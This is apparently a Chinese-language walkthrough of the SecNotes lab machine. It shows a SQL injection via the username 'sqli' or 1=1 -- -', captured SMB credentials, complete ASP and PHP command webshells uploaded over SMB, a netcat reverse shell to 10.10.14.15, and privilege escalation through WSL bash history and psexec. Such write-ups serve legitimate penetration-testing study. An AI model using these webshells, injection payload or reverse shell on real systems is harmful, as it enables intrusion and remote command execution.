# SecNotes\_97

![image-20200917091349923](assets/SecNotes_97.assets/image-20200917091349923.png)

![image-20200710082442404](assets/SecNotes_97.assets/image-20200710082442404.png)

![image-20200710083122580](assets/SecNotes_97.assets/image-20200710083122580.png)

![image-20200710084616020](assets/SecNotes_97.assets/image-20200710084616020.png)

尝试注册

![image-20200710085126592](assets/SecNotes_97.assets/image-20200710085126592.png)

查看越权也没有可供利用的点，

![image-20200710091153636](assets/SecNotes_97.assets/image-20200710091153636.png)

在尝试了一些功能后在，发现提交note后，主页的删除功能应该是调用了数据库功能。

再尝试了一些事情后仍然没有突破口。而且445端口也没有可以利用的点或能够获得的信息。

由于是页面逻辑是显示用户的所有note，那数据库的语句可能是类似`SELECT * FROM notes WHERE user = 'evil'`

尝试在用户名上进行注入

重新注册

![image-20200710100544414](assets/SecNotes_97.assets/image-20200710100544414.png)

![image-20200710100623929](assets/SecNotes_97.assets/image-20200710100623929.png)

尝试更多的注入尝试

![image-20200710093653171](assets/SecNotes_97.assets/image-20200710093653171.png)

![image-20200710093736058](assets/SecNotes_97.assets/image-20200710093736058.png)

500,应该是存在注入的。

经过多次重试各种注释符号/

最终确认注释应该是`-- -`

注册用户为`sqli' or 1=1 -- -`

成功注入，读取到所有的notes

![image-20200710094153230](assets/SecNotes_97.assets/image-20200710094153230.png)

似乎有个凭据

![image-20200710094456529](assets/SecNotes_97.assets/image-20200710094456529.png)

看上面的链接格式应该smb

那下面的凭证也应该是smb的凭证。

```bash
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```

首先为htb增加hosts

![image-20200710094801519](assets/SecNotes_97.assets/image-20200710094801519.png)

使用得到的凭证登录

```bash
smbclient -U tyler //secnotes.htb/new-site
```

![image-20200710095310422](assets/SecNotes_97.assets/image-20200710095310422.png)

发现两个文件。get下来

![image-20200710095434894](assets/SecNotes_97.assets/image-20200710095434894.png)

两文件都指向一个新的iis网页，网页服务应该在另一个端口上。

![image-20200710101035514](assets/SecNotes_97.assets/image-20200710101035514.png)

我们在端口扫描时一定错过了，重新进行全端口扫瞄

利用凭证重新查看一下权限。IIS所在目录应该是可写的，我们可以猜测这个目录就是new-site正在运行的目录。

![image-20200710103428772](assets/SecNotes_97.assets/image-20200710103428772.png)

我们可以上传一个asp webshell文件以及nc直接保存到这个位置，再在web进行激活。

```text
<!--
ASP Webshell
Working on latest IIS
Referance :-
https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp
http://stackoverflow.com/questions/11501044/i-need-execute-a-command-line-in-a-visual-basic-script
http://www.w3schools.com/asp/
-->
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>

<HTML>
<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>
<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>

</BODY>
</HTML>
```

![image-20200710104750915](assets/SecNotes_97.assets/image-20200710104750915.png)

但是当我们试图激活webshell时我们发现目录已经自动删除这两个文件了。

由于目录中存在htm和png后缀的文件，所以这两个后缀是不会被删除的。但是稍后发现，无论是什么后缀是都会被删除的。

总之

重新制作一个html+php的cmdwebshell,与nc一起put进smb

webshell.php

```text
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<?php
if($_GET['cmd']) {
  system($_GET['cmd']);
  }
?>
</pre>
</BODY></HTML>
```

![image-20200710114700946](assets/SecNotes_97.assets/image-20200710114700946.png)

虽然直接浏览页面是500,但仍然可以通过在浏览器地址栏执行cmd命令得到shell

```text
nc -e cmd.exe 10.10.14.15 1337
```

![image-20200710114822602](assets/SecNotes_97.assets/image-20200710114822602.png)

![image-20200710114951984](assets/SecNotes_97.assets/image-20200710114951984.png)

同时我们注意到有一个bash的快捷方式。

![image-20200710115323143](assets/SecNotes_97.assets/image-20200710115323143.png)

快捷方式指向`C:\Windows\System32\bash.exe`

通常存在bash可能是windows中存在wsl

直接执行镜像目录下的bash即可进入wsl中的系统，

先搜索一下镜像bash的位置

```text
dir /s bash.exe
```

![image-20200710120101171](assets/SecNotes_97.assets/image-20200710120101171.png)

执行

![image-20200710120252823](assets/SecNotes_97.assets/image-20200710120252823.png)

flag肯定不会在子系统内

看看能不能找到一些线索

![image-20200710120434640](assets/SecNotes_97.assets/image-20200710120434640.png)

bash历史记录中直接显示了管理员进行的smb链接

利用psexec及已知凭证直接连接

完

![image-20200710114111456](assets/SecNotes_97.assets/image-20200710114111456.png)

